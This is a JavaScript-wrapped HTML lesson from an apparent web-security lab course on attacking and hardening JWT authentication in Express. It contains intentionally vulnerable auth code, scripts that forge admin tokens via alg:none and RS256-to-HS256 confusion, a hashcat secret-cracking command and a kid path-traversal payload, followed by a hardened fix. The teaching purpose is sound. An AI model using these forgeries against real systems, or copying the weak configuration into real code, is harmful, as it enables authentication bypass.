window.LESSONS = window.LESSONS || {};
window.LESSONS.jwt = `

<h1 class="lesson-title">Lab 07: JWT Attacks</h1>

<p class="lesson-subtitle">
  JSON Web Tokens are everywhere in modern authentication. They are also one of the most frequently misconfigured
  security mechanisms in web development. In this lab, you will build a JWT-based auth system with intentionally
  weak configuration, exploit it three different ways, and then lock it down properly. By the end, you will
  understand not just how to use JWTs, but how they break.
</p>

<hr>

<h2>Why JWTs Are a Security Minefield</h2>

<p>
  I have a complicated relationship with JWTs. On one hand, they solve a real problem -- stateless authentication
  across distributed systems. On the other hand, I have personally exploited JWT misconfigurations in more
  penetration tests than I can count. The issue is not with the JWT specification itself (though it has its
  critics). The issue is that the specification gives developers so many knobs to turn that most of them end up
  turning the wrong ones. Weak secrets, missing algorithm restrictions, tokens that never expire, sensitive data
  stuffed into payloads -- I have seen all of it in production.
</p>

<p>
  The fundamental thing you need to understand about JWTs is that they are not encrypted. A JWT is three
  base64url-encoded segments separated by dots: the header, the payload, and the signature. Anyone can decode
  the header and payload. The signature is the only thing that provides integrity -- it proves the token was
  issued by someone who knows the secret key and that the contents have not been tampered with. If the
  signature verification is broken, the entire security model collapses.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 1</span> Build JWT Auth Endpoints</h2>

<p>
  We are going to build a login endpoint that issues JWTs and a protected route that verifies them. And we are
  going to do it wrong on purpose, because that is how you learn where the landmines are.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">routes/auth.js -- Vulnerable JWT implementation</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> express = <span class="fn">require</span>(<span class="str">'express'</span>);
<span class="kw">const</span> jwt = <span class="fn">require</span>(<span class="str">'jsonwebtoken'</span>);
<span class="kw">const</span> router = express.<span class="fn">Router</span>();

<span class="cmt">// VULNERABLE: hardcoded weak secret</span>
<span class="kw">const</span> SECRET = <span class="str">'secret'</span>;

<span class="cmt">// Login -- issue a token</span>
router.<span class="fn">post</span>(<span class="str">'/api/auth/login'</span>, (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=></span> {
  <span class="kw">const</span> { username, password } = req.body;

  <span class="kw">const</span> user = db.<span class="fn">findUser</span>(username);
  <span class="kw">if</span> (!user || user.password !== password) { <span class="cmt">// Plaintext comparison!</span>
    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ error: <span class="str">'Invalid credentials'</span> });
  }

  <span class="cmt">// VULNERABLE: no algorithm restriction, weak secret,</span>
  <span class="cmt">// no expiry, no issuer/audience claims</span>
  <span class="kw">const</span> token = jwt.<span class="fn">sign</span>(
    { userId: user.id, username: user.username, role: user.role },
    SECRET
  );

  res.<span class="fn">json</span>({ token });
});

<span class="cmt">// Protected route -- verify token</span>
router.<span class="fn">get</span>(<span class="str">'/api/auth/profile'</span>, (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=></span> {
  <span class="kw">const</span> authHeader = req.headers.authorization;
  <span class="kw">if</span> (!authHeader) {
    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ error: <span class="str">'No token provided'</span> });
  }

  <span class="kw">const</span> token = authHeader.<span class="fn">split</span>(<span class="str">' '</span>)[<span class="num">1</span>];

  <span class="kw">try</span> {
    <span class="cmt">// VULNERABLE: no algorithms whitelist</span>
    <span class="kw">const</span> decoded = jwt.<span class="fn">verify</span>(token, SECRET);
    res.<span class="fn">json</span>({ user: decoded });
  } <span class="kw">catch</span> (err) {
    res.<span class="fn">status</span>(<span class="num">403</span>).<span class="fn">json</span>({ error: <span class="str">'Invalid token'</span> });
  }
});

module.exports = router;
  </pre>
</div>

<p>
  Let me walk you through every vulnerability in this code. First, the secret is the string <code>'secret'</code>.
  That is literally the most common JWT secret on the internet. Second, there is no algorithm restriction on
  <code>jwt.verify()</code> -- it will accept whatever algorithm the token's header claims to use. Third, there
  is no expiration on the token, so once issued, it is valid forever. Fourth, there are no issuer or audience
  claims, so the token could be replayed against any service that uses the same secret. Fifth, the password
  comparison is plaintext -- no bcrypt, no hashing at all. This code is a security horror show, and I have
  seen worse in production.
</p>

<p>
  Let me also briefly explain the JWT structure for those who have not looked inside one. A JWT has three parts
  separated by dots. The header specifies the algorithm and token type:
  <code>{"alg":"HS256","typ":"JWT"}</code>. The payload contains the claims -- your user data, expiration,
  issuer, and whatever else you put in there. The signature is an HMAC (for HS256) or RSA signature (for RS256)
  computed over the header and payload. All three parts are base64url encoded, which is not encryption -- it is
  just encoding. Anyone with the token can read the header and payload by decoding them.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 2</span> The alg:none Attack</h2>

<p>
  This is the attack that made the security community collectively facepalm when it was first widely disclosed.
  The JWT specification includes an algorithm called "none" -- it means the token has no signature. It was
  intended for cases where the token's integrity is guaranteed by other means (like being inside a TLS-encrypted
  channel that the server controls end to end). In practice, some JWT libraries would accept
  <code>"alg":"none"</code> tokens and skip signature verification entirely. You can probably see where this
  is going.
</p>

<div class="attack-box">
  <div class="attack-box-title">Crafting an alg:none Token</div>

  <div class="code-block">
    <div class="code-header">
      <span class="code-file">exploit/alg-none-attack.js</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
<span class="cmt">// Step 1: Craft the header with alg set to "none"</span>
<span class="kw">const</span> header = {
  alg: <span class="str">'none'</span>,
  typ: <span class="str">'JWT'</span>
};

<span class="cmt">// Step 2: Craft the payload -- give ourselves admin</span>
<span class="kw">const</span> payload = {
  userId: <span class="num">1</span>,
  username: <span class="str">'admin'</span>,
  role: <span class="str">'admin'</span>
};

<span class="cmt">// Step 3: Base64url encode both parts</span>
<span class="kw">function</span> <span class="fn">base64url</span>(obj) {
  <span class="kw">return</span> Buffer
    .<span class="fn">from</span>(JSON.<span class="fn">stringify</span>(obj))
    .<span class="fn">toString</span>(<span class="str">'base64'</span>)
    .<span class="fn">replace</span>(<span class="str">/=/g</span>, <span class="str">''</span>)
    .<span class="fn">replace</span>(<span class="str">/\+/g</span>, <span class="str">'-'</span>)
    .<span class="fn">replace</span>(<span class="str">/\//g</span>, <span class="str">'_'</span>);
}

<span class="cmt">// Step 4: Assemble the token with an empty signature</span>
<span class="kw">const</span> forgedToken = <span class="str">\`\${</span><span class="fn">base64url</span>(header)<span class="str">}.\${</span><span class="fn">base64url</span>(payload)<span class="str">}.\`</span>;

console.<span class="fn">log</span>(<span class="str">'Forged token:'</span>, forgedToken);

<span class="cmt">// Step 5: Use it</span>
<span class="cmt">// curl -H "Authorization: Bearer &lt;forgedToken&gt;" localhost:3000/api/auth/profile</span>
    </pre>
  </div>
</div>

<p>
  Look at what just happened. We created a JWT with any claims we want -- admin role, any user ID, whatever
  we like -- and set the algorithm to "none." The signature section is empty (just a trailing dot). If the
  server's JWT library accepts this, it skips signature verification entirely and treats the payload as valid.
  We have just forged an authentication token without knowing the secret key. We did not crack anything. We
  did not exploit a buffer overflow. We politely asked the library to not check the signature, and it obliged.
</p>

<p>
  Why does this happen? Because <code>jwt.verify()</code> without an explicit <code>algorithms</code> whitelist
  defers to whatever algorithm the token claims in its header. If the token says "none," some library versions
  say, "Sure, no signature needed." Modern versions of the <code>jsonwebtoken</code> npm package have mitigated
  this by rejecting "none" by default, but older versions and other libraries in other languages have been
  vulnerable. And even with modern libraries, explicitly whitelisting algorithms is a defense-in-depth measure
  you should always have in place.
</p>

<div class="callout warn">
  <div class="callout-title">Never Trust the Token's Algorithm Claim</div>
  <div class="callout-text">
    The algorithm is specified in the token's header, which is controlled by whoever creates the token.
    If the server trusts the token to declare its own algorithm, the attacker controls the verification
    process. Always specify the allowed algorithms on the server side: <code>jwt.verify(token, secret,
    { algorithms: ['HS256'] })</code>. This is the single most important JWT security configuration.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 3</span> Brute-Forcing Weak Secrets</h2>

<p>
  The alg:none attack works when the library is misconfigured. But what if the library is fine and rejects
  "none"? If the secret is weak, the attacker has another path: brute-force it. Remember, an HS256 JWT
  signature is just HMAC-SHA256 computed over the header and payload using the secret key. If the attacker
  has a valid token (which they do -- they can log in as any user and get one), they have a known plaintext
  and a known hash. Cracking the secret is now a standard offline password-cracking problem.
</p>

<div class="attack-box">
  <div class="attack-box-title">Cracking JWT Secrets with hashcat</div>

  <div class="code-block">
    <div class="code-header">
      <span class="code-file">Terminal -- hashcat attack</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
<span class="cmt"># Save a valid JWT to a file</span>
<span class="fn">echo</span> <span class="str">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.&lt;signature&gt;"</span> <span class="op">&gt;</span> jwt.txt

<span class="cmt"># Crack it against a wordlist</span>
<span class="fn">hashcat</span> -a <span class="num">0</span> -m <span class="num">16500</span> jwt.txt wordlist.txt

<span class="cmt"># Mode 16500 is JWT (HS256/HS384/HS512)</span>
<span class="cmt"># With the secret "secret", this cracks instantly</span>
    </pre>
  </div>
</div>

<p>
  With a secret like <code>'secret'</code>, hashcat cracks it in under a second. It will try every word in
  the wordlist, compute the HMAC-SHA256 signature, and compare it to the token's signature. When it finds a
  match, you have the secret. And once you have the secret, you can sign any token you want with any claims
  you want. You are the authentication system now.
</p>

<p>
  Even slightly more complex secrets fall quickly. <code>'myappsecret123'</code>, <code>'jwt_secret_key'</code>,
  <code>'supersecret'</code> -- these are all crackable in minutes with a decent GPU and a good wordlist. I
  have cracked JWT secrets on real penetration tests in under an hour using nothing more exotic than the
  rockyou.txt wordlist.
</p>

<p>
  How long does a JWT secret need to be? For HS256, the key should have at least 256 bits of entropy -- that
  means 32 bytes of cryptographically random data. Not 32 characters of a passphrase. 32 bytes from
  <code>crypto.randomBytes(32)</code>. A human-chosen passphrase, no matter how long, will never have the
  entropy density of random bytes. Use a random key generator, store it in an environment variable, and never
  commit it to version control.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 4</span> Algorithm Confusion -- RS256 to HS256</h2>

<p>
  This is, in my opinion, the most elegant JWT attack, and it perfectly illustrates why the algorithm must
  be enforced server-side. It targets applications that use RS256 (RSA asymmetric signing) but do not restrict
  the algorithm in the verification step.
</p>

<p>
  Here is how RS256 normally works. The server has an RSA key pair: a private key and a public key. When it
  issues a token, it signs it with the private key. When it verifies a token, it uses the public key. The
  private key is secret; the public key is, well, public. You might even expose it at a <code>/.well-known/jwks.json</code>
  endpoint. This is fine because RSA is asymmetric -- knowing the public key does not let you forge signatures.
</p>

<p>
  Now here is the attack. The attacker changes the token's algorithm from RS256 to HS256. HS256 is symmetric --
  the same key is used to both sign and verify. The server's verification code calls something like
  <code>jwt.verify(token, publicKey)</code>. When the algorithm was RS256, <code>publicKey</code> was used as
  an RSA public key for asymmetric verification. But now the token claims HS256, and if the library honors that
  claim, it uses <code>publicKey</code> as the HMAC symmetric secret. The attacker knows the public key. The
  attacker can now compute a valid HMAC-SHA256 signature using the public key as the secret. The server verifies
  it with the same public key, the HMAC matches, and the forged token is accepted.
</p>

<div class="attack-box">
  <div class="attack-box-title">Algorithm Confusion Attack Flow</div>

  <div class="code-block">
    <div class="code-header">
      <span class="code-file">exploit/alg-confusion.js</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
<span class="kw">const</span> crypto = <span class="fn">require</span>(<span class="str">'crypto'</span>);
<span class="kw">const</span> fs = <span class="fn">require</span>(<span class="str">'fs'</span>);

<span class="cmt">// Step 1: Get the server's public key (it is public!)</span>
<span class="kw">const</span> publicKey = fs.<span class="fn">readFileSync</span>(<span class="str">'./public-key.pem'</span>);

<span class="cmt">// Step 2: Craft header switching from RS256 to HS256</span>
<span class="kw">const</span> header = { alg: <span class="str">'HS256'</span>, typ: <span class="str">'JWT'</span> };
<span class="kw">const</span> payload = { userId: <span class="num">1</span>, username: <span class="str">'admin'</span>, role: <span class="str">'admin'</span> };

<span class="kw">const</span> encodedHeader = <span class="fn">base64url</span>(header);
<span class="kw">const</span> encodedPayload = <span class="fn">base64url</span>(payload);
<span class="kw">const</span> signingInput = <span class="str">\`\${encodedHeader}.\${encodedPayload}\`</span>;

<span class="cmt">// Step 3: Sign with HMAC using the PUBLIC KEY as the secret</span>
<span class="kw">const</span> signature = crypto
  .<span class="fn">createHmac</span>(<span class="str">'sha256'</span>, publicKey)
  .<span class="fn">update</span>(signingInput)
  .<span class="fn">digest</span>(<span class="str">'base64url'</span>);

<span class="kw">const</span> forgedToken = <span class="str">\`\${signingInput}.\${signature}\`</span>;

<span class="cmt">// The server calls jwt.verify(token, publicKey)</span>
<span class="cmt">// Token says HS256, so library uses publicKey as HMAC secret</span>
<span class="cmt">// Our signature matches -- token accepted!</span>
    </pre>
  </div>
</div>

<p>
  Let me restate the core insight because it is worth really absorbing. The server's code says
  <code>jwt.verify(token, publicKey)</code>. When the token's algorithm is RS256, the library interprets
  <code>publicKey</code> as an RSA public key and performs asymmetric verification. When the token's algorithm
  is HS256, the library interprets the exact same <code>publicKey</code> variable as an HMAC symmetric secret.
  The attacker controls which interpretation is used by changing one field in the token header. The public key
  is known, so the attacker can compute a valid HMAC signature. That is the entire attack.
</p>

<div class="callout info">
  <div class="callout-title">This Is a Real CVE</div>
  <div class="callout-text">
    Algorithm confusion has been assigned CVEs in multiple JWT libraries across multiple languages. It is not
    a theoretical attack. It has been found in production systems and exploited in real penetration tests.
    The fix is always the same: explicitly specify the allowed algorithm on the server side and never let the
    token dictate how it should be verified.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 5</span> The Fix -- Hardened JWT Configuration</h2>

<p>
  Now let us fix everything. Every single vulnerability we exploited comes down to weak configuration. The
  JWT specification is fine. The libraries are fine (when used correctly). The problem is always in how
  developers configure them.
</p>

<div class="fix-box">
  <div class="fix-box-title">Production-Hardened JWT Implementation</div>

  <div class="code-block">
    <div class="code-header">
      <span class="code-file">routes/auth.js -- Fixed implementation</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
<span class="kw">const</span> express = <span class="fn">require</span>(<span class="str">'express'</span>);
<span class="kw">const</span> jwt = <span class="fn">require</span>(<span class="str">'jsonwebtoken'</span>);
<span class="kw">const</span> bcrypt = <span class="fn">require</span>(<span class="str">'bcrypt'</span>);
<span class="kw">const</span> crypto = <span class="fn">require</span>(<span class="str">'crypto'</span>);
<span class="kw">const</span> router = express.<span class="fn">Router</span>();

<span class="cmt">// FIXED: Strong random secret from environment variable</span>
<span class="cmt">// Generated with: crypto.randomBytes(32).toString('hex')</span>
<span class="kw">const</span> SECRET = process.env.JWT_SECRET;

<span class="kw">if</span> (!SECRET || SECRET.length < <span class="num">64</span>) {
  <span class="kw">throw new</span> <span class="fn">Error</span>(<span class="str">'JWT_SECRET must be at least 64 hex characters (256 bits)'</span>);
}

<span class="cmt">// Token configuration</span>
<span class="kw">const</span> TOKEN_CONFIG = {
  algorithm: <span class="str">'HS256'</span>,
  expiresIn: <span class="str">'15m'</span>,         <span class="cmt">// Short-lived access tokens</span>
  issuer: <span class="str">'myapp.local'</span>,
  audience: <span class="str">'myapp-users'</span>
};

<span class="cmt">// Login -- issue a token</span>
router.<span class="fn">post</span>(<span class="str">'/api/auth/login'</span>, <span class="kw">async</span> (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=></span> {
  <span class="kw">const</span> { username, password } = req.body;

  <span class="kw">const</span> user = <span class="kw">await</span> db.<span class="fn">findUser</span>(username);
  <span class="kw">if</span> (!user) {
    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ error: <span class="str">'Invalid credentials'</span> });
  }

  <span class="cmt">// FIXED: bcrypt comparison instead of plaintext</span>
  <span class="kw">const</span> valid = <span class="kw">await</span> bcrypt.<span class="fn">compare</span>(password, user.passwordHash);
  <span class="kw">if</span> (!valid) {
    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ error: <span class="str">'Invalid credentials'</span> });
  }

  <span class="cmt">// FIXED: explicit algorithm, expiry, issuer, audience</span>
  <span class="kw">const</span> token = jwt.<span class="fn">sign</span>(
    { userId: user.id, username: user.username, role: user.role },
    SECRET,
    {
      algorithm: TOKEN_CONFIG.algorithm,
      expiresIn: TOKEN_CONFIG.expiresIn,
      issuer: TOKEN_CONFIG.issuer,
      audience: TOKEN_CONFIG.audience
    }
  );

  res.<span class="fn">json</span>({ token });
});

<span class="cmt">// Protected route -- verify token</span>
router.<span class="fn">get</span>(<span class="str">'/api/auth/profile'</span>, (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=></span> {
  <span class="kw">const</span> authHeader = req.headers.authorization;
  <span class="kw">if</span> (!authHeader?.startsWith(<span class="str">'Bearer '</span>)) {
    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ error: <span class="str">'No token provided'</span> });
  }

  <span class="kw">const</span> token = authHeader.<span class="fn">slice</span>(<span class="num">7</span>);

  <span class="kw">try</span> {
    <span class="cmt">// FIXED: explicit algorithms whitelist + issuer/audience check</span>
    <span class="kw">const</span> decoded = jwt.<span class="fn">verify</span>(token, SECRET, {
      algorithms: [<span class="str">'HS256'</span>],   <span class="cmt">// Only accept HS256</span>
      issuer: TOKEN_CONFIG.issuer,
      audience: TOKEN_CONFIG.audience
    });
    res.<span class="fn">json</span>({ user: decoded });
  } <span class="kw">catch</span> (err) {
    <span class="kw">if</span> (err.name === <span class="str">'TokenExpiredError'</span>) {
      <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ error: <span class="str">'Token expired'</span> });
    }
    res.<span class="fn">status</span>(<span class="num">403</span>).<span class="fn">json</span>({ error: <span class="str">'Invalid token'</span> });
  }
});

module.exports = router;
    </pre>
  </div>
</div>

<p>
  Let me walk through every fix. The secret is now loaded from an environment variable and must be at least
  256 bits (64 hex characters). It is generated with <code>crypto.randomBytes(32).toString('hex')</code>,
  which gives you true cryptographic randomness that is completely unguessable. The <code>algorithms</code>
  option in <code>jwt.verify()</code> is explicitly set to <code>['HS256']</code>. This means the server
  will reject any token that claims a different algorithm -- "none" is rejected, RS256 is rejected, everything
  except HS256 is rejected. This single configuration line prevents both the alg:none attack and algorithm
  confusion.
</p>

<p>
  The token now expires in 15 minutes. This limits the damage window if a token is leaked. The issuer and
  audience claims prevent token replay across different services. And the password comparison now uses bcrypt
  instead of plaintext, which was a separate but equally critical vulnerability.
</p>

<h3>Refresh Token Rotation</h3>

<p>
  With a 15-minute access token, your users would have to log in constantly. The production pattern is to
  pair short-lived access tokens with longer-lived refresh tokens. The refresh token is stored server-side
  (in a database), is single-use, and when used, it issues a new access token and a new refresh token. If an
  attacker steals a refresh token and uses it, the legitimate user's next refresh attempt will fail (because
  the token was already consumed), which alerts you to the compromise. This is called refresh token rotation,
  and it is the standard approach for production JWT authentication.
</p>

<hr>

<h2 class="step"><span class="step-label">Deeper</span> Token Leakage and kid Injection</h2>

<p>
  Even with perfect JWT configuration, tokens can still be compromised through leakage. Let me walk you through
  the most common ways JWTs end up in places they should not be.
</p>

<h3>JWTs in URLs</h3>

<p>
  I have seen applications pass JWTs as URL query parameters:
  <code>/dashboard?token=eyJhbGci...</code>. This is dangerous for several reasons. The URL ends up in
  browser history, in server logs, in proxy logs, and critically, in the <code>Referer</code> header. If the
  user clicks any external link from that page, the full URL (including the token) is sent to the external
  server in the Referer header. You have just leaked your authentication token to a third party. Always send
  JWTs in the <code>Authorization</code> header, never in URLs.
</p>

<h3>JWTs in Server Logs</h3>

<p>
  Structured logging is great practice. Logging the full request headers is not. If your logging middleware
  dumps all HTTP headers into your log aggregator, every authenticated request includes the JWT in the
  Authorization header. Anyone with access to your logs -- and that is often a much wider group than you think
  -- can extract valid tokens and impersonate users. Configure your logger to redact or exclude the
  Authorization header explicitly.
</p>

<h3>kid (Key ID) Injection</h3>

<p>
  The JWT header supports a <code>kid</code> (Key ID) field that tells the server which key to use for
  verification. This is useful when you rotate keys -- the server can look up the correct key by its ID.
  But here is the problem: if the server uses the <code>kid</code> value to construct a file path or database
  query without sanitizing it, the attacker controls input to a file read or query operation.
</p>

<div class="attack-box">
  <div class="attack-box-title">kid Path Traversal</div>

  <div class="code-block">
    <div class="code-header">
      <span class="code-file">Vulnerable server-side key lookup</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
<span class="cmt">// Server looks up the key file based on kid</span>
<span class="kw">const</span> header = <span class="fn">decodeHeader</span>(token);
<span class="kw">const</span> keyPath = <span class="str">\`./keys/\${header.kid}.pem\`</span>; <span class="cmt">// VULNERABLE!</span>
<span class="kw">const</span> key = fs.<span class="fn">readFileSync</span>(keyPath);
<span class="kw">const</span> decoded = jwt.<span class="fn">verify</span>(token, key);

<span class="cmt">// Attacker sets kid to: ../../dev/null</span>
<span class="cmt">// Key becomes empty, token signed with empty string</span>

<span class="cmt">// Or on Linux: ../../../dev/null</span>
<span class="cmt">// readFileSync returns empty buffer</span>
<span class="cmt">// Attacker signs token with empty string as HMAC key</span>
    </pre>
  </div>
</div>

<p>
  If the attacker sets <code>kid</code> to a path traversal string like <code>../../dev/null</code>, the
  server reads <code>/dev/null</code> (which returns empty data), and the effective signing key becomes an
  empty string. The attacker can then sign their forged token with an empty string as the HMAC secret, and
  the server will accept it. In SQL-based key stores, the <code>kid</code> could be used for SQL injection
  if it is concatenated into a query unsanitized. Always validate and sanitize the <code>kid</code> value
  against a whitelist of known key identifiers.
</p>

<h3>Why Short-Lived Tokens Matter</h3>

<p>
  All of these leakage scenarios share a common mitigation: short-lived tokens. If a token leaks but expires
  in 15 minutes, the attacker has a 15-minute window to use it. That is not great, but it is dramatically
  better than a token that never expires. Combined with refresh token rotation, you get a system where leaked
  access tokens have limited blast radius and stolen refresh tokens are detectable. This is not perfect
  security -- nothing is -- but it is the production pattern that balances security with usability, and it
  is what you should be implementing.
</p>

<div class="callout info">
  <div class="callout-title">The Production JWT Pattern</div>
  <div class="callout-text">
    Short-lived access tokens (15 minutes) in the Authorization header. Refresh tokens stored server-side,
    single-use, with rotation detection. Explicit algorithm whitelist. Strong random secret from environment
    variables. Issuer and audience claims. Bcrypt password hashing. This is the baseline. Everything else
    is optimization.
  </div>
</div>

<hr>

<h2>Task Checklist</h2>

<ul class="task-list">
  <li><span class="task-check"></span> Build the vulnerable JWT login and profile endpoints with a hardcoded weak secret</li>
  <li><span class="task-check"></span> Craft an alg:none token and use it to access the protected route as admin</li>
  <li><span class="task-check"></span> Use hashcat to crack the weak secret from a captured JWT</li>
  <li><span class="task-check"></span> Demonstrate the RS256-to-HS256 algorithm confusion attack (conceptual or with a test setup)</li>
  <li><span class="task-check"></span> Rewrite the auth routes with a strong random secret, explicit algorithm whitelist, and expiry</li>
  <li><span class="task-check"></span> Replace plaintext password comparison with bcrypt hashing and verification</li>
  <li><span class="task-check"></span> Add issuer and audience claims to both sign and verify options</li>
</ul>

<div class="section-nav">
  <button class="nav-btn" data-prev="csrf">Back: CSRF</button>
  <button class="nav-btn" data-next="idor">Next: IDOR</button>
</div>

`;
